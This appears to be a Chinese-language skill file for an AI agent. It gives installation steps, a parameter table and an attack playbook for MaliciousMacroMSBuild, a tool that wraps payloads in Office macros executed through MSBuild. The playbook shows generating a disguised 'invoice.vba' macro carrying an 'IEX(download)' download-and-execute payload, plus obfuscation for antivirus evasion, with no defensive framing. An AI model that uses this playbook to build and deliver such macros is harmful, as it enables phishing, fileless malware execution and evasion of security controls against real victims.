---
name: m3-gen-msbuild
description: 渗透工具 skill:MaliciousMacroMSBuild 的安装、参数速查与攻击场景 playbook。当任务涉及 无文件与LOLBins滥用 需要调用 MaliciousMacroMSBuild 时使用。
---

# MaliciousMacroMSBuild

- 攻击大类:C23 无文件与LOLBins滥用
- 上游仓库:https://github.com/infosecn1nja/MaliciousMacroMSBuild
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/infosecn1nja/MaliciousMacroMSBuild
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 m3-gen.py -p 'cmd /c whoami' -o macro.vba` | 宏+MSBuild 生成 |
| `-p powershell -o out.vba` | PS 载荷 |
| `-e` | 混淆 |

## 攻击场景 Playbook

### 宏内嵌 MSBuild 免杀

```bash
python3 m3-gen.py -p 'IEX(download)' -o invoice.vba
# 文档内执行无文件
```

## 注意事项

infosecn1nja 出品,宏+MSBuild 组合载荷。
